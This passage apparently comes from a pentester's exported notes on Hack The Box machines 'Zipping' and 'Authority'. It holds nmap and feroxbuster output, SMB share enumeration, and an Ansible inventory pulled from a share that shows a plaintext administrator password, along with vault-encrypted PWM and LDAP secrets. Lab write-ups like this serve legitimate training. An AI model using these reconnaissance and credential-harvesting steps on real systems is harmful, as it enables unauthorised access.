|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 29.92 seconds
           Raw packets sent: 65798 (2.895MB) | Rcvd: 65604 (2.624MB)</rich_text>
      </node>
      <node name="exploit" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694605419" ts_lastsave="1694610956"/>
      <node name="busting" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694610936" ts_lastsave="1694610950">
        <rich_text>
┌──(haha150㉿jmp)-[~/htb/zipping]
└─$ feroxbuster --url </rich_text>
        <rich_text link="webs http://10.129.171.190/">http://10.129.171.190/</rich_text>
        <rich_text>

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://10.129.171.190/">http://10.129.171.190/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       32l       75w      877c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/js/creative-design.js">http://10.129.171.190/assets/js/creative-design.js</rich_text>
        <rich_text>
200      GET     1081l     1807w    16450c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/themify-icons/css/themify-icons.css">http://10.129.171.190/assets/vendors/themify-icons/css/themify-icons.css</rich_text>
        <rich_text>
200      GET       20l      161w    19167c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/avatar2.jpg">http://10.129.171.190/assets/imgs/avatar2.jpg</rich_text>
        <rich_text>
200      GET       98l      642w    55959c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/service.jpg">http://10.129.171.190/assets/imgs/service.jpg</rich_text>
        <rich_text>
200      GET     7013l    22369w   222911c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/bootstrap.bundle.js">http://10.129.171.190/assets/vendors/bootstrap/bootstrap.bundle.js</rich_text>
        <rich_text>
200      GET       79l      474w    34447c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/avatar3.jpg">http://10.129.171.190/assets/imgs/avatar3.jpg</rich_text>
        <rich_text>
200      GET    11491l    22991w   238590c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/css/creative-design.css">http://10.129.171.190/assets/css/creative-design.css</rich_text>
        <rich_text>
200      GET        7l      989w    78635c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/bootstrap.bundle.min.js">http://10.129.171.190/assets/vendors/bootstrap/bootstrap.bundle.min.js</rich_text>
        <rich_text>
200      GET      999l     3841w   287185c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/header.jpg">http://10.129.171.190/assets/imgs/header.jpg</rich_text>
        <rich_text>
301      GET        9l       28w      317c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets">http://10.129.171.190/assets</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/">http://10.129.171.190/assets/</rich_text>
        <rich_text>
301      GET        9l       28w      315c </rich_text>
        <rich_text link="webs http://10.129.171.190/shop">http://10.129.171.190/shop</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/">http://10.129.171.190/shop/</rich_text>
        <rich_text>
200      GET      149l     1103w    98927c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/img-3.jpg">http://10.129.171.190/assets/imgs/img-3.jpg</rich_text>
        <rich_text>
200      GET      162l      483w     4838c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/bootstrap.affix.js">http://10.129.171.190/assets/vendors/bootstrap/bootstrap.affix.js</rich_text>
        <rich_text>
301      GET        9l       28w      318c </rich_text>
        <rich_text link="webs http://10.129.171.190/uploads">http://10.129.171.190/uploads</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.171.190/uploads/">http://10.129.171.190/uploads/</rich_text>
        <rich_text>
200      GET      113l      380w     5322c </rich_text>
        <rich_text link="webs http://10.129.171.190/upload.php">http://10.129.171.190/upload.php</rich_text>
        <rich_text>
200      GET       53l      326w    27609c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/avatar1.jpg">http://10.129.171.190/assets/imgs/avatar1.jpg</rich_text>
        <rich_text>
200      GET      293l     1501w   126456c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/img-2.jpg">http://10.129.171.190/assets/imgs/img-2.jpg</rich_text>
        <rich_text>
200      GET      178l      952w    82533c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/img-1.jpg">http://10.129.171.190/assets/imgs/img-1.jpg</rich_text>
        <rich_text>
200      GET    10598l    42768w   280364c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.js">http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.js</rich_text>
        <rich_text>
200      GET      317l     1354w    16738c </rich_text>
        <rich_text link="webs http://10.129.171.190/">http://10.129.171.190/</rich_text>
        <rich_text>
200      GET        2l     1276w    88145c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.min.js">http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.min.js</rich_text>
        <rich_text>
200      GET     4435l    10973w   131637c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/bootstrap.js">http://10.129.171.190/assets/vendors/bootstrap/bootstrap.js</rich_text>
        <rich_text>
200      GET      344l      898w     6803c </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets/style.css">http://10.129.171.190/shop/assets/style.css</rich_text>
        <rich_text>
200      GET        1l        2w   108769c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.slim.min.map">http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.slim.min.map</rich_text>
        <rich_text>
200      GET        2l     1037w    71037c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.slim.min.js">http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.slim.min.js</rich_text>
        <rich_text>
200      GET        1l        7w   136409c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.min.map">http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.min.map</rich_text>
        <rich_text>
200      GET       60l      373w    25360c </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets/imgs/watch2.jpg">http://10.129.171.190/shop/assets/imgs/watch2.jpg</rich_text>
        <rich_text>
200      GET     8495l    34583w   227022c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.slim.js">http://10.129.171.190/assets/vendors/jquery/jquery-3.4.1.slim.js</rich_text>
        <rich_text>
200      GET      223l     1249w    98259c </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets/imgs/watch4.jpg">http://10.129.171.190/shop/assets/imgs/watch4.jpg</rich_text>
        <rich_text>
200      GET      138l      676w    58288c </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets/imgs/watch.jpg">http://10.129.171.190/shop/assets/imgs/watch.jpg</rich_text>
        <rich_text>
200      GET      491l     3043w   236463c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/bg-img-1.jpg">http://10.129.171.190/assets/imgs/bg-img-1.jpg</rich_text>
        <rich_text>
200      GET      748l     4308w   347996c </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets/imgs/featured-image.jpg">http://10.129.171.190/shop/assets/imgs/featured-image.jpg</rich_text>
        <rich_text>
200      GET        1l     9770w   250568c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/bootstrap.js.map">http://10.129.171.190/assets/vendors/bootstrap/bootstrap.js.map</rich_text>
        <rich_text>
200      GET      548l     3223w   240131c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/bg-img-2.jpg">http://10.129.171.190/assets/imgs/bg-img-2.jpg</rich_text>
        <rich_text>
200      GET       71l      148w     2405c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/creative-design.scss">http://10.129.171.190/assets/scss/creative-design.scss</rich_text>
        <rich_text>
200      GET        7l      662w    58072c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/bootstrap.min.js">http://10.129.171.190/assets/vendors/bootstrap/bootstrap.min.js</rich_text>
        <rich_text>
200      GET       10l       41w      205c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/base/_typography.scss">http://10.129.171.190/assets/scss/base/_typography.scss</rich_text>
        <rich_text>
200      GET       14l       27w      233c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/base/_base.scss">http://10.129.171.190/assets/scss/base/_base.scss</rich_text>
        <rich_text>
200      GET       11l       19w      154c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/components/_code.scss">http://10.129.171.190/assets/scss/components/_code.scss</rich_text>
        <rich_text>
301      GET        9l       28w      346c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/vendors/bootstrap-4.3.1">http://10.129.171.190/assets/scss/vendors/bootstrap-4.3.1</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/vendors/bootstrap-4.3.1/">http://10.129.171.190/assets/scss/vendors/bootstrap-4.3.1/</rich_text>
        <rich_text>
200      GET       19l       30w      260c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/base/_utilities.scss">http://10.129.171.190/assets/scss/base/_utilities.scss</rich_text>
        <rich_text>
200      GET       64l      110w      963c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/components/_navbar.scss">http://10.129.171.190/assets/scss/components/_navbar.scss</rich_text>
        <rich_text>
200      GET        3l        4w       37c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/components/_dropdowns.scss">http://10.129.171.190/assets/scss/components/_dropdowns.scss</rich_text>
        <rich_text>
200      GET      233l      394w     4606c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/layout/_sections.scss">http://10.129.171.190/assets/scss/layout/_sections.scss</rich_text>
        <rich_text>
200      GET       78l      120w     1258c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/layout/_footer.scss">http://10.129.171.190/assets/scss/layout/_footer.scss</rich_text>
        <rich_text>
200      GET       63l      131w     1363c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/layout/_header.scss">http://10.129.171.190/assets/scss/layout/_header.scss</rich_text>
        <rich_text>
200      GET        1l     9770w   190253c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/bootstrap.min.js.map">http://10.129.171.190/assets/vendors/bootstrap/bootstrap.min.js.map</rich_text>
        <rich_text>
200      GET        1l    20953w   402249c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/bootstrap.bundle.js.map">http://10.129.171.190/assets/vendors/bootstrap/bootstrap.bundle.js.map</rich_text>
        <rich_text>
200      GET        0l        0w   311949c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/bootstrap.bundle.min.js.map">http://10.129.171.190/assets/vendors/bootstrap/bootstrap.bundle.min.js.map</rich_text>
        <rich_text>
301      GET        9l       28w      322c </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets">http://10.129.171.190/shop/assets</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets/">http://10.129.171.190/shop/assets/</rich_text>
        <rich_text>
200      GET       30l      149w     9445c </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets/imgs/watch3.jpg">http://10.129.171.190/shop/assets/imgs/watch3.jpg</rich_text>
        <rich_text>
200      GET       41l      220w     1903c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/abstracts/_mixins.scss">http://10.129.171.190/assets/scss/abstracts/_mixins.scss</rich_text>
        <rich_text>
200      GET      226l      394w     5256c </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/abstracts/_variables.scss">http://10.129.171.190/assets/scss/abstracts/_variables.scss</rich_text>
        <rich_text>
[####################] - 33s    90115/90115   0s      found:53      errors:8      
[####################] - 31s    30000/30000   962/s   </rich_text>
        <rich_text link="webs http://10.129.171.190/">http://10.129.171.190/</rich_text>
        <rich_text> 
[####################] - 7s     30000/30000   4513/s  </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/imgs/">http://10.129.171.190/assets/imgs/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 32s    30000/30000   926/s   </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/">http://10.129.171.190/shop/</rich_text>
        <rich_text> 
[####################] - 6s     30000/30000   5179/s  </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/themify-icons/">http://10.129.171.190/assets/vendors/themify-icons/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 7s     30000/30000   4238/s  </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/bootstrap/">http://10.129.171.190/assets/vendors/bootstrap/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 7s     30000/30000   4425/s  </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/">http://10.129.171.190/assets/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 0s     30000/30000   149254/s </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/js/">http://10.129.171.190/assets/js/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 0s     30000/30000   150754/s </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/css/">http://10.129.171.190/assets/css/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 0s     30000/30000   71259/s </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/jquery/">http://10.129.171.190/assets/vendors/jquery/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 2s     30000/30000   14375/s </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/vendors/">http://10.129.171.190/assets/vendors/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 27s    30000/30000   1132/s  </rich_text>
        <rich_text link="webs http://10.129.171.190/uploads/">http://10.129.171.190/uploads/</rich_text>
        <rich_text> 
[####################] - 0s     30000/30000   365854/s </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets/">http://10.129.171.190/shop/assets/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 4s     30000/30000   6862/s  </rich_text>
        <rich_text link="webs http://10.129.171.190/shop/assets/imgs/">http://10.129.171.190/shop/assets/imgs/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 0s     30000/30000   370370/s </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/">http://10.129.171.190/assets/scss/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 4s     30000/30000   7891/s  </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/abstracts/">http://10.129.171.190/assets/scss/abstracts/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 0s     30000/30000   416667/s </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/components/">http://10.129.171.190/assets/scss/components/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 0s     30000/30000   410959/s </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/layout/">http://10.129.171.190/assets/scss/layout/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 4s     30000/30000   8446/s  </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/base/">http://10.129.171.190/assets/scss/base/</rich_text>
        <rich_text> =&gt; Directory listing
[####################] - 0s     30000/30000   422535/s </rich_text>
        <rich_text link="webs http://10.129.171.190/assets/scss/vendors/">http://10.129.171.190/assets/scss/vendors/</rich_text>
        <rich_text> =&gt; Directory listing</rich_text>
      </node>
    </node>
    <node name="Authority" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698956952" ts_lastsave="1699117590">
      <node name="nmap" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698956959" ts_lastsave="1698957282">
        <rich_text>sudo nmap -p- -sC -sV 10.129.70.115 -oA nmap/all
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-11-02 21:32 CET
Nmap scan report for 10.129.70.115
Host is up (0.026s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-03 00:33:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-03T00:34:08+00:00; +4h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-03T00:34:08+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-03T00:34:08+00:00; +4h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-03T00:34:08+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-11-01T00:29:38
|_Not valid after:  2025-11-02T12:08:02
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Fri, 03 Nov 2023 00:33:10 GMT
|     Connection: close
|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0;URL='/pwm'"/&gt;&lt;/head&gt;&lt;/html&gt;
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Fri, 03 Nov 2023 00:33:10 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Fri, 03 Nov 2023 00:33:16 GMT
|     Connection: close
|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
|     Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
|_    Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at </rich_text>
        <rich_text link="webs https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</rich_text>
        <rich_text> :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=11/2%Time=65440786%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,\x2003\x20No
SF:v\x202023\x2000:33:10\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n&lt;
SF:html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:&gt;&lt;/head&gt;&lt;/html&gt;")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Fr
SF:i,\x2003\x20Nov\x202023\x2000:33:10\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,\
SF:x2003\x20Nov\x202023\x2000:33:10\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Fri,\x2003\x20Nov\x202023\x2000:33
SF::16\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20la
SF:ng=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request&lt;/title&gt;&lt;style\x20type=\"text/css\"&gt;body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}&lt;/s
SF:tyle&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest&lt;/h1&gt;&lt;hr\x20class=\"line\"\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\x20Exception\x20Re
SF:port&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&amp;#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]&lt;/p&gt;&lt;p&gt;&lt;
SF:b&gt;Description&lt;/b&gt;\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-03T00:34:01
|_  start_date: N/A
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 120.64 seconds</rich_text>
      </node>
      <node name="smb" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698956979" ts_lastsave="1698959116">
        <rich_text>smbclient -L \\\\authority.htb\\        
Password for [WORKGROUP\haha150]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Department Shares Disk      
	Development     Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to authority.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


smbclient \\\\authority.htb\\Development 
Password for [WORKGROUP\haha150]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Mar 17 14:20:38 2023
  ..                                  D        0  Fri Mar 17 14:20:38 2023
  Automation                          D        0  Fri Mar 17 14:20:40 2023

		5888511 blocks of size 4096. 1196367 blocks available
smb: \&gt;
smb: \Automation\Ansible\PWM\&gt; get ansible_inventory

cat ansible_inventory 
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore

smb: \Automation\Ansible\PWM\defaults\&gt; get main.yml

cat main.yml         
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
